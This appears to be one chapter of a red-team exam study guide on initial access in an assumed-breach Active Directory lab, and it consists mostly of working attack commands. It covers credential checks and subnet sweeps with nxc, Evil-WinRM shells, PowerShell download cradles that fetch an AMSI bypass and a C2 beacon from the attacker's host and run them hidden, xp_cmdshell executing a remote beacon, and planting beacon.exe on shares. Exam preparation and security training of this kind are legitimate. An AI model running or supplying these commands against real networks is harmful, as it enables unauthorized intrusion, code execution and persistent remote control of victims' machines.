# Phase 03: Initial Access (Assumed Breach)

> The exam starts with low-priv domain user credentials. Your job is to turn those into a C2 beacon.

---

## Assumed Breach Starting Point

You will be given: `domain\username` + password. This is your assumed breach credential. It's a standard domain user — no local admin, no special rights.

**First actions**:
```bash
# 1. Verify the credential works
nxc smb <DC_IP> -u username -p Password1 -d domain.local

# 2. Find hosts you can reach
nxc smb <subnet>/24 -u username -p Password1 --no-bruteforce 2>/dev/null | grep -v "[-]"

# 3. Check WinRM (port 5985) — quickest route to interactive shell
nxc winrm <target_list> -u username -p Password1

# 4. If WinRM is open → instant interactive shell
evil-winrm -i <target_ip> -u username -p Password1 -d domain.local
```

## Getting Your Beacon Running

```powershell
# From Evil-WinRM shell or any PowerShell access:

# Step 1: bypass AMSI (Phase 02)
# Step 2: download + execute beacon
IEX (New-Object Net.WebClient).DownloadString('http://<your_ip>/amsi_bypass.ps1')
(New-Object Net.WebClient).DownloadFile('http://<your_ip>/beacon.exe','C:\Windows\Temp\svc.exe')
C:\Windows\Temp\svc.exe

# Or: all-in-one cradle
powershell -w hidden -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<ip>/stager.ps1')"
```

## Misconfigured Services / Portals

Look for exposed services during initial network scan:
```bash
nmap -sV -p 80,443,8080,8443,3389,5985,1433,3306 <subnet>/24 --open -oN initial_scan.txt
```

Common exam entry points:
- **RDP (3389)** — if creds work, instant GUI access
- **WinRM (5985)** — Evil-WinRM for PowerShell shell
- **SMB (445)** — share access, sometimes writable shares
- **HTTP portal** — may have auth bypass or default creds
- **MSSQL (1433)** — login with domain creds, xp_cmdshell if sysadmin

## Abusing Misconfigured Services

```bash
# MSSQL with domain creds
mssqlclient.py domain/username:Password1@<mssql_ip> -windows-auth
SQL> EXEC xp_cmdshell 'whoami'
SQL> EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<ip>/beacon.ps1'')"'

# Scheduled task (if you have write access to a share)
net use \\<target>\share /user:domain\username Password1
copy beacon.exe \\<target>\share\beacon.exe
# Then find a way to trigger execution (scheduled task, service, etc.)
```

---

## Next Step → **Phase 04: Local Enumeration** (`04-local-enum.md`)
